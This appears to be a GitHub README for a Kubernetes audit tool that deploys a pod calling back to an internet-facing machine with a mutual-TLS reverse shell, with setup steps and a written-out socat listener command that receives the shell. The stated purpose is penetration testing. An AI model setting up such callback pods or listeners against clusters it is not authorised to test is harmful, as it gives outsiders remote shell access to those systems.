# Kubernetesaudit
Some tools to setup a mutual TLS reverse shell. Which might be useful when perform kubernetes-audits, from the perspective of a hacked container running in a kubernetes pod.

If you have access to the kubernetes environment with sufficient priviliges your can just get a shell on the container like this:

```
kubectl get pods
NAME                                          READY   STATUS    RESTARTS   AGE
kubernetesaudit-deployment-1da5e985c3-akafb   1/1     Running   0          32m

kubectl exec -it kubernetesaudit-deployment-1da5e985c3-akafb -- /bin/bash
```

Otherwise you might have to set up a pod which performs a callback with a reverse shell to your internet exposed machine.

## Dockerfile
The dockerfile contains the setup for the docker image. It is just a debian with some useful tools, such as kubectl. And the reverse shell of course. Uncomment the gitrepos if you want those repos as well.
The image is also available here:
https://hub.docker.com/r/xapax/kubernetesaudit

## setuppki.sh
This is just a simple easyrsa-wrapper that creates a CA, server certificate and client certificate. It also creates the file-structure to serve your https-server, and then to receive your incoming client-authenticated reverse shell.

The script should be run on the machine where you want to host your webserver and reverse shell.
It will also create a random token. Used to create a path on the server where client-cert and CA is provided from.
This random token needs to be added to your deploymentspecs_kubernetes.yaml file. Together with your domain as well.

## deploymentspecs_kubernetes.yaml
This is the kubernetes Deployment for creating the Kubernetesaudit image as a kubernetes pod.

It can be deployed in your kubernetes cluster like this:

```
kubectl create -f deploymentspecs_kubernetes.yaml
```


## 1. Set up Reverse shell listener and stuff
- A. Get a domain-name if you don't already have one.
- B. Run Certbot to get a free let's encrypt certificate.

Run `setuppki.sh`, and follow the instructions.
Take note of the generated random token, you will need it in the next step.

Configure this https-python-server so that is uses the certificates generated by certbot: https://github.com/xapax/python-https-server

run `python ../server.py` from `webconfigprovider`. Now wait until the image is deployed, as it will be in the next step.


## 2. Deploy pod
A. Configure `deploymentspecs_kubernetes.yaml`. Specify your domain. And specify the random token that was generated in step 1. 

Now deploy it to your kubernetes cluster, or have someone with sufficient privilige deploy it.

```
kubectl create -f deploymentspecs_kubernetes.yaml
```

Now you will see a request to `server.py`. Trying to get three files (ca root cert, client cert and reverseshell config). If it manages to get those three files your can get your shell.

Close down `server.py`

## 3. Start reverse shell listener

Go to `~/revlistener`, there you will have your certificates. So just run the following command to get your incoming reverse shell:

```
sudo socat file:`tty`,raw,echo=0 openssl-listen:443,reuseaddr,cert=server.pem,cafile=ca.crt
```



## Credit
The reverse shell and docker image was created by https://github.com/Doctor-love. All credit to Doctor-love! 
